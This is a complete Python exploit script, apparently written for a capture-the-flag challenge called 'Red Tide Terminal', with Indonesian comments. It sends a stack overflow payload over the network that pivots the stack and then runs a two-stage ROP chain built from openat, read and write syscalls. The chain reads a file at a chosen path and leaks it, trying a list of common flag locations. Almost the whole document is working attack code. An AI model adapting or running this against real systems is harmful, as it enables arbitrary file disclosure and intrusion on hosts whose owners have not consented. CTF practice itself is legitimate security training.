#!/usr/bin/env python3
import argparse
import re
import socket
import struct
import sys
import time

POP_RDI    = 0x4013EC
POP_RSI    = 0x4013F5
POP_RDX    = 0x4013FE
POP_RAX    = 0x401407
SYSCALL_RET = 0x401410
LEAVE_RET   = 0x4013E6

STAGE2_ADDR = 0x404300
OFFSET_SAVED_RBP = 0x60
MAX_PACKET = 0xF0

FLAG_RE = re.compile(rb"grodno\{[^}\r\n]+\}")


def p64(value):
    return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)


def flat(values):
    return b"".join(p64(value) for value in values)


def recvuntil(sock, token, timeout=5):
    data = bytearray()
    deadline = time.monotonic() + timeout

    while token not in data:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError(
                f"timeout menunggu {token!r}; output={bytes(data)!r}"
            )

        sock.settimeout(min(0.5, remaining))

        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            continue

        if not chunk:
            raise EOFError(
                f"koneksi putus sebelum {token!r}; output={bytes(data)!r}"
            )

        data += chunk

    return bytes(data)


def recvall(sock, idle_timeout=2):
    data = bytearray()
    deadline = time.monotonic() + idle_timeout
    sock.settimeout(0.25)

    while time.monotonic() < deadline:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            continue

        if not chunk:
            break

        data += chunk
        deadline = time.monotonic() + idle_timeout

    return bytes(data)


def build_stage1():
    chain = flat([
        # read(0, STAGE2_ADDR, 0x400)
        POP_RDI,
        0,
        POP_RSI,
        STAGE2_ADDR,
        POP_RDX,
        0x400,
        POP_RAX,
        0,
        SYSCALL_RET,

        # rbp sudah berisi STAGE2_ADDR
        LEAVE_RET,
    ])

    payload = b"A" * OFFSET_SAVED_RBP
    payload += p64(STAGE2_ADDR)  # saved RBP
    payload += chain             # saved RIP + ROP

    if len(payload) > MAX_PACKET:
        raise RuntimeError(
            f"stage-1 terlalu panjang: {len(payload):#x}"
        )

    return payload


def build_stage2(flag_path):
    path_addr = STAGE2_ADDR + 0x300
    io_addr = STAGE2_ADDR + 0x500

    chain = flat([
        # Dikonsumsi oleh leave; ret sebagai RBP baru.
        0,

        # openat(AT_FDCWD, path_addr, O_RDONLY, 0)
        POP_RDI,
        -100,
        POP_RSI,
        path_addr,
        POP_RDX,
        0,
        POP_RAX,
        257,
        SYSCALL_RET,

        # read(3, io_addr, 0x100)
        POP_RDI,
        3,
        POP_RSI,
        io_addr,
        POP_RDX,
        0x100,
        POP_RAX,
        0,
        SYSCALL_RET,

        # write(1, io_addr, 0x100)
        POP_RDI,
        1,
        POP_RSI,
        io_addr,
        POP_RDX,
        0x100,
        POP_RAX,
        1,
        SYSCALL_RET,

        # exit(0)
        POP_RDI,
        0,
        POP_RAX,
        60,
        SYSCALL_RET,
    ])

    encoded_path = flag_path.encode()

    if len(encoded_path) >= 0x80:
        raise RuntimeError("path terlalu panjang")

    stage2 = chain.ljust(0x300, b"B")
    stage2 += encoded_path + b"\x00"
    stage2 = stage2.ljust(0x400, b"\x00")

    return stage2


def exploit_once(host, port, flag_path):
    stage1 = build_stage1()
    stage2 = build_stage2(flag_path)

    sock = socket.create_connection((host, port), timeout=5)

    try:
        recvuntil(sock, b"Codename:\n")
        sock.sendall(b"red-tide\n")

        initial = recvuntil(sock, b"Packet length:\n")

        sock.sendall(str(len(stage1)).encode() + b"\n")
        prompt = recvuntil(sock, b"Packet data:\n")

        # Dikirim dalam satu TCP write.
        # read pertama mengambil stage-1 sesuai panjang packet.
        # Sisa 0x400 byte menunggu untuk syscall read di ROP.
        sock.sendall(stage1 + stage2)

        output = initial + prompt + recvall(sock)
        return output

    finally:
        sock.close()


def main():
    parser = argparse.ArgumentParser(
        description="Red Tide Terminal remote exploit"
    )
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    parser.add_argument("--path")
    args = parser.parse_args()

    paths = (
        [args.path]
        if args.path
        else [
            "flag.txt",
            "./flag.txt",
            "flag",
            "/flag",
            "/flag.txt",
            "/app/flag.txt",
            "/home/ctf/flag.txt",
            "/challenge/flag.txt",
        ]
    )

    for path in paths:
        print(f"[*] mencoba path: {path}")

        try:
            output = exploit_once(
                args.host,
                args.port,
                path,
            )
        except (
            OSError,
            EOFError,
            TimeoutError,
            RuntimeError,
        ) as error:
            print(f"[-] gagal: {error}")
            continue

        match = FLAG_RE.search(output)

        if match:
            flag = match.group(0).decode()
            print(f"<FLAG>{flag}</FLAG>")
            return 0

        cleaned = output.replace(b"\x00", b"")
        tail = cleaned[-300:].decode(errors="replace")

        if tail.strip():
            print(f"[-] belum ada flag, output akhir:\n{tail}")

    print("[-] semua kandidat path gagal")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
